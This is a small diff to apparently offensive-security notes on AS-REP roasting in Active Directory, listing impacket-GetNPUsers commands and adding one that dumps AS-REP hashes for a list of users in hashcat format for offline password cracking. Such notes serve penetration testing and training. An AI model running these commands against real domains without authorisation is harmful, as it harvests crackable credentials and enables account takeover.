@@ -17,3 +17,7 @@ If obtained, the hash can be cracked offline to retrieve the plaintext password.
     impacket-GetNPUsers <domain>/<username>[:password] -dc-ip <DomainControllerIP>
     impacket-GetNPUsers <domain>/<username> -dc-ip <DomainControllerIP> -no-pass
     impacket-GetNPUsers -request -dc-ip <DomainControllerIP> <domain>/<username>
+
+Output in hashcat format
+
+    impacket-GetNPUsers -request -outputfile np.txt -format hashcat -usersfile <file_with_usernames> <domain>/
